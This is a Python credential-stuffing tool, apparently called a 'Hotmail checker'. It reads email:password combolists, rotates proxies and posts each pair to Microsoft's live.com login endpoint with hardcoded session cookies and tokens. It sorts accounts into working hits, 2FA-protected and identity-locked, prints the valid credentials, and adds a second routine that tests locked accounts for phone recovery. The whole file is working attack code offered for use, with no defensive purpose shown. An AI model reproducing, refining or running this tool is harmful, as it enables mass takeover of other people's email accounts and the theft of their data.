# Tool Make By Mai Ngoc Hao (Lucius)
# Facebook: @usermnh 
# Telegram: @lucius_164
#    __            _        
#   / /  __ ______(_)_ _____
#  / /__/ // / __/ / // (_-<
# /____/\_,_/\__/_/\_,_/___/
# Last Fixed: 17:50 PM - 1/1/2024 | Version 4

# fix content is next: save data ; proxies ; elapsed ; ctypes is main
import requests
import os 
import sys 
import time
import threading
import ctypes 
import random
from threading import Thread
from tkinter import filedialog

os.system('title Hotmail.com checker @usermnh')
def HotmailClient(): # checker
    class HotmailClient:
        hits = 0
        bad = 0
        vrp = 0
        identity = 0 
        retry = 0 
        auth = 0 
        total_checker = 0 
        Red = '\033[0;31m'
        Green = '\033[0;32m'
        Yellow = '\033[0;33m'
        White = '\033[0;37m'
        Cyan = '\033[0;36m'
        Orange = '\033[38;5;208m'
        start_time = time.time()
        def __init__(self) -> None:
            pass
        def login(self, email, password):
            prx = open(file_prx, 'r').readlines()
            proxies = {
                'http': 'http://' + random.choice(prx).strip(),
                'https': 'http://' + random.choice(prx).strip()
            }
            while True:
                try:
                    self.headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                    "Pragma": "no-cache",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Upgrade-Insecure-Requests": "1",
                    "Referer": "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1",
                    "Cookie": "wlidperf=FR=L&ST=1573475967016; MSPShared=1; SDIDC=CavoGthu*pkJAN8Eek6dWr5opN5x1BL2!mueAsRqcHLVS94TF9fJG7M1fnoFg6a*recSzMqgr*rslJH2ICxiqJGNoOHcIMFXc!RLunwBMWhU0x321UT4GCRmUx6DZ7AjzurT*F2lfakG55iffb2VLqMt0mhzOabJGnTjvNhmJC9g1p*grJ8oN9vhRFP1QX!nZ!fWcW27*aTbPPnlAGv9aKLWqL*MazqS52WCQ1qeFZq2cv5ZfnxVwVkgfgjdQvs2GEwfHcnTOQx1uQdtaK9OZwguM8Ck!XoiweJLLeKfFhKRZuntwAkM7ZR0uwP6Z19dR7mBTpGpy5F6!dyrkpKizd9!nzZSFFo*7poLWKhu1rNfXZj1IGgaH9sTsatt8!OJcUye6DGBEO2UgVGMYZSXh3qZLLQfoCt27U2AyIJI2kF!CwX2SD8t9RLWxmz1S3NIVWmBO8wm!DlUH1lpURHmiXbk1m!22SzIKy09LvlGae8GFkF!Rx57Ef2CKW5i5QTBtQ$$; IgnoreCAW=1; MSCC=1571654982; mkt=en-US; optimizelyEndUserId=oeu1572238927711r0.5850160263416339; uaid=e94a49f177664960a3fca122edaf8a27; MSPRequ=id=292543&lt=1573475927&co=1; OParams=11DUe2VlF3OgbQNYrRZRg3REn8KImGd*MjJ03B0XHPylHxLr2YAXrzYNH!J96HFWgoWGEdSPWFdPiET54l8VSW7HH0FPuC0Ce2pxC2uyWUloRhCunIwMUB8QUtvNr0as9T1RluKxlaF5K4LNi7CWjITDPFW2tzU!gS5LVvUdG58wfPg1itYuqY2HKQNrXN51!s!LMD8g2Gf5pcrXZibicJLoN1z5P3XSQm2UhakTdBNoDEruwv8MWbzT!5ImiwMzPP*G5APiiLE!9EKUwPT49z1!ERSbMlpzjFZP25j3o01h!9VuAllBJeaaJeclbcH9QuCwvUd2N3Z6kCiV5jlEKbyfAbHAiIJ6TNAmwU3ftHK08Fy5L6vUHSZRyocbR18FVCoP7lMVfmfQfS41VEmD3JdZTwjJIosaE7!i7E31jx5gwDqYZpo0wjnRzQlt3I9twovyRxbRxuvMVRqN7ey0AE7XI67w70kjUoRg*NbmI2BAxmuNnAdujjs4YlLsdZ8iIIFk73CkQpQ6X!MO58xB09KYImQyevehtDlrXkr*oDQCAh; MSPOK=$uuid-6b855d49-8f09-4e83-8526-b756788bf3b9$uuid-02a3151d-ba2d-4c6c-be88-c9c804ecb043",
                    }
                    self.payload = f'i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DZshWk88CvvuA9vSOHldJLurwIJH4a7uUREfu4fGCsbB2nL*YUw36i0Lz7tZDGptQxZhUTW0%21*ZM3oIUxGKEeEa1gcx%21XzBNiXpzf*U9iH68RaP3u20G0J6k2%21UdeMFc9C9uusE3IwI3gi4u7wJzyq8FCiNuk2Hly66dMuX96mSwHTYXgtZZpS%21rbS35jrsdC%21Ku4UysydsP0MXSz2klYp9KU%21hDHeKBZIu13h%21rQk9jG2vzCW4OerTedipQDJRuAg%24%24&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i2=1&i17=0&i18=&i19=32099'
                    self.login = requests.post(f'https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1&contextid=C61E086B741A7BC9&bk=1573475927&uaid=e94a49f177664960a3fca122edaf8a27&pid=0',headers=self.headers,data=self.payload,proxies=proxies, timeout = 10).text
                    # Cpm
                    self.end_time = time.time()
                    self.execution_time = self.end_time - HotmailClient.start_time
                    self.cpm = round(HotmailClient.total_checker / self.execution_time * 60)
                    # Process Data 
                    self.proccess_data = round(HotmailClient.total_checker / num_lines * 100,2)
                    HotmailClient.total_checker+=1
                   
                    #Set Title CMD
                    ctypes.windll.kernel32.SetConsoleTitleW('Administrator: Hotmail Checker - Checked: {}/{} ({}%) | Hits: {} | 2FA: {} | Identity: {} | Bad: {} | Retries: {} | CPM: {}'.format(HotmailClient.total_checker, num_lines, self.proccess_data, HotmailClient.hits, HotmailClient.auth,HotmailClient.identity, HotmailClient.bad, HotmailClient.retry, self.cpm))
                    if ('account.live.com/tou/accrue' in self.login) or ('sSigninName' in self.login) or ('action="https://account.live.com/profile/accrue?mkt' in self.login):
                        HotmailClient.hits+=1
                        print('{}[Hits] {}:{}'.format(HotmailClient.Green,email,password))
                    elif ('timed out' in self.login) or ('Your account or password is incorrect.' in self.login):
                        HotmailClient.bad+=1
                    elif ('Email/Confirm?mkt' in self.login) or ('/cancel?mkt=' in self.login) or ('/Abuse?mkt=' in self.login) or ('account.live.com/recover?mkt' in self.login):
                        HotmailClient.auth+=1
                        print('{}[2Fa] {}:{}'.format(HotmailClient.Orange,email,password))
                    elif ('account.live.com/proofs/Verify?mkt' in self.login) or ('account.live.com/identity/confirm?mkt') in self.login:
                        HotmailClient.identity+=1
                        print('{}[Identity] {}:{}'.format(HotmailClient.Orange,email,password))
                    else:
                        HotmailClient.bad+=1
                    break
                except Exception as e:
                    HotmailClient.retry+=1
                    continue
    if __name__ == '__main__':
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""

   __ __     __             _ __  _______           __          
  / // /__  / /___ _  ___ _(_) / / ___/ /  ___ ____/ /_____ ____
 / _  / _ \/ __/  ' \/ _ `/ / / / /__/ _ \/ -_) __/  '_/ -_) __/
/_//_/\___/\__/_/_/_/\_,_/_/_/  \___/_//_/\__/\__/_/\_\\__/_/   
                                                                
        """.format(HotmailClient.Cyan)+'\n')
        while True:
            try: 
                file_email = filedialog.askopenfilename(title="Select File Combolist", filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
                num_lines = sum(1 for line in open(file_email, 'r', encoding='utf-8'))
                break
            except:
                continue
        while True:
            file_prx = filedialog.askopenfilename(title="Select File Proxies", filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
            if file_prx:
                pass
                break
            else:
                continue
        while True:
            try:
                thread_numb = int(input('{}Thread: '.format(HotmailClient.Green)))
                break
            except:
                print('{}Failed!'.format(HotmailClient.Red))
                continue
        print('{}Refresh Client !'.format(HotmailClient.Red))
        with open(file_email, 'r', encoding = 'utf-8') as file:
            threads = []
            for line in file.readlines():
                data = line.strip().split(':')
                if len(data) == 2:
                    email = data[0]
                    password = data[1]
                elif len(data) == 1:
                    email = data[0]
                    password = None
                else:
                    sys.exit()
                try:
                    thread = threading.Thread(target = HotmailClient().login, args = (email, password))
                except:
                    pass
                threads.append(thread)
                thread.start()
                if len(threads) >= thread_numb:
                    for thread in threads:
                        thread.join()
                        threads = []
            for thread in threads:
                thread.join()
                
def HotmailVRPClient(): # Check vrp
    class HotmailVRPClient:
        bad = 0
        vrp = 0
        retry = 0 
        auth = 0
        total_checker = 0 
        Red = '\033[0;31m'
        Green = '\033[0;32m'
        Yellow = '\033[0;33m'
        White = '\033[0;37m'
        Cyan = '\033[0;36m'
        Orange = '\033[38;5;208m'
        start_time = time.time()
        def __init__(self) -> None:
            pass
        def login(self, email, password):
            while True:
                try:
                    self.headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                    "Pragma": "no-cache",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Upgrade-Insecure-Requests": "1",
                    "Referer": "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1",
                    "Cookie": "wlidperf=FR=L&ST=1573475967016; MSPShared=1; SDIDC=CavoGthu*pkJAN8Eek6dWr5opN5x1BL2!mueAsRqcHLVS94TF9fJG7M1fnoFg6a*recSzMqgr*rslJH2ICxiqJGNoOHcIMFXc!RLunwBMWhU0x321UT4GCRmUx6DZ7AjzurT*F2lfakG55iffb2VLqMt0mhzOabJGnTjvNhmJC9g1p*grJ8oN9vhRFP1QX!nZ!fWcW27*aTbPPnlAGv9aKLWqL*MazqS52WCQ1qeFZq2cv5ZfnxVwVkgfgjdQvs2GEwfHcnTOQx1uQdtaK9OZwguM8Ck!XoiweJLLeKfFhKRZuntwAkM7ZR0uwP6Z19dR7mBTpGpy5F6!dyrkpKizd9!nzZSFFo*7poLWKhu1rNfXZj1IGgaH9sTsatt8!OJcUye6DGBEO2UgVGMYZSXh3qZLLQfoCt27U2AyIJI2kF!CwX2SD8t9RLWxmz1S3NIVWmBO8wm!DlUH1lpURHmiXbk1m!22SzIKy09LvlGae8GFkF!Rx57Ef2CKW5i5QTBtQ$$; IgnoreCAW=1; MSCC=1571654982; mkt=en-US; optimizelyEndUserId=oeu1572238927711r0.5850160263416339; uaid=e94a49f177664960a3fca122edaf8a27; MSPRequ=id=292543&lt=1573475927&co=1; OParams=11DUe2VlF3OgbQNYrRZRg3REn8KImGd*MjJ03B0XHPylHxLr2YAXrzYNH!J96HFWgoWGEdSPWFdPiET54l8VSW7HH0FPuC0Ce2pxC2uyWUloRhCunIwMUB8QUtvNr0as9T1RluKxlaF5K4LNi7CWjITDPFW2tzU!gS5LVvUdG58wfPg1itYuqY2HKQNrXN51!s!LMD8g2Gf5pcrXZibicJLoN1z5P3XSQm2UhakTdBNoDEruwv8MWbzT!5ImiwMzPP*G5APiiLE!9EKUwPT49z1!ERSbMlpzjFZP25j3o01h!9VuAllBJeaaJeclbcH9QuCwvUd2N3Z6kCiV5jlEKbyfAbHAiIJ6TNAmwU3ftHK08Fy5L6vUHSZRyocbR18FVCoP7lMVfmfQfS41VEmD3JdZTwjJIosaE7!i7E31jx5gwDqYZpo0wjnRzQlt3I9twovyRxbRxuvMVRqN7ey0AE7XI67w70kjUoRg*NbmI2BAxmuNnAdujjs4YlLsdZ8iIIFk73CkQpQ6X!MO58xB09KYImQyevehtDlrXkr*oDQCAh; MSPOK=$uuid-6b855d49-8f09-4e83-8526-b756788bf3b9$uuid-02a3151d-ba2d-4c6c-be88-c9c804ecb043",
                    }
                    self.payload = f'i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DZshWk88CvvuA9vSOHldJLurwIJH4a7uUREfu4fGCsbB2nL*YUw36i0Lz7tZDGptQxZhUTW0%21*ZM3oIUxGKEeEa1gcx%21XzBNiXpzf*U9iH68RaP3u20G0J6k2%21UdeMFc9C9uusE3IwI3gi4u7wJzyq8FCiNuk2Hly66dMuX96mSwHTYXgtZZpS%21rbS35jrsdC%21Ku4UysydsP0MXSz2klYp9KU%21hDHeKBZIu13h%21rQk9jG2vzCW4OerTedipQDJRuAg%24%24&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i2=1&i17=0&i18=&i19=32099'
                    self.login = requests.post(f'https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1&contextid=C61E086B741A7BC9&bk=1573475927&uaid=e94a49f177664960a3fca122edaf8a27&pid=0',headers=self.headers,data=self.payload).text
                    # Cpm
                    self.end_time = time.time()
                    self.execution_time = self.end_time - HotmailVRPClient.start_time
                    self.cpm = round(HotmailVRPClient.total_checker / self.execution_time * 60)
                    # Process Data 
                    self.proccess_data = round(HotmailVRPClient.total_checker / num_lines * 100,2)
                    HotmailVRPClient.total_checker+=1
                   
                    #Set Title CMD 
                    ctypes.windll.kernel32.SetConsoleTitleW('Administrator: Hotmail Checker Veriphone - Checked: {}/{} ({}%) | VRP: {} | 2FA: {} | Bad: {} | Retries: {} | CPM: {}'.format(HotmailVRPClient.total_checker, num_lines, self.proccess_data, HotmailVRPClient.vrp, HotmailVRPClient.auth, HotmailVRPClient.bad,HotmailVRPClient.retry, self.cpm))
                    if ('Email/Confirm?mkt' in self.login) or ('/cancel?mkt=' in self.login) or ('/Abuse?mkt=' in self.login) or ('account.live.com/recover?mkt' in self.login):
                        self.ipt = self.login.split('name="ipt" id="ipt" value="')[1].split('">')[0]
                        self.pprid = self.login.split('name="pprid" id="pprid" value="')[1].split('">')[0]
                        self.uaid = self.login.split('name="uaid" id="uaid" value="')[1].split('">')[0]
                        self.url = self.login.split('<form name="fmHF" id="fmHF" action="')[1].split('" method="post"')[0]
                        self.data = {
                            'ipt': self.ipt,
                            'pprid': self.pprid,
                            'uaid': self.uaid
                        }
                        self.check_vrp = requests.post(self.url,data=self.data).text   
                        if ('https://account.live.com/API/ac/CollectPhone' in self.check_vrp):
                            HotmailVRPClient.vrp+=1
                            print('{}[Vrp] {}:{}'.format(HotmailVRPClient.Orange,email,password))
                        elif ('https://account.live.com/API/Proofs/VerifyCode' in self.check_vrp):
                            HotmailVRPClient.auth+=1
                            print('{}[2Fa] {}:{}'.format(HotmailVRPClient.Orange,email,password))
                    else:
                        HotmailVRPClient.bad+=1
                    break
                except Exception as e:
                    print(e)
                    HotmailVRPClient.retry+=1
                    continue
    if __name__ == '__main__':
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""{}
   __ __     __             _ __  _______           __          
  / // /__  / /___ _  ___ _(_) / / ___/ /  ___ ____/ /_____ ____
 / _  / _ \/ __/  ' \/ _ `/ / / / /__/ _ \/ -_) __/  '_/ -_) __/
/_//_/\___/\__/_/_/_/\_,_/_/_/  \___/_//_/\__/\__/_/\_\\__/_/   
                                                                
       """.format(HotmailVRPClient.cyan)+'\n')
        while True:
            try: 
                file_email = filedialog.askopenfilename(title="Select File Combolist", filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
                num_lines = sum(1 for line in open(file_email, 'r', encoding='utf-8'))
                break
            except:
                continue
        while True:
            try:
                thread_numb = int(input('{}Thread: '.format(HotmailVRPClient.Green)))
                break
            except:
                print('{}Failed!'.format(HotmailVRPClient.Red))
                continue
        print('{}Refresh Client !'.format(HotmailVRPClient.Red))
        with open(file_email, 'r', encoding = 'utf-8') as file:
            threads = []
            for line in file.readlines():
                data = line.strip().split(':')
                if len(data) == 2:
                    email = data[0]
                    password = data[1]
                elif len(data) == 1:
                    email = data[0]
                    password = None
                else:
                    sys.exit()
                thread = threading.Thread(target = HotmailVRPClient().login, args = (email, password))
                threads.append(thread)
                thread.start()
                if len(threads) >= thread_numb:
                    for thread in threads:
                        thread.join()
                        threads = []
            for thread in threads:
                thread.join()
HotmailClient()
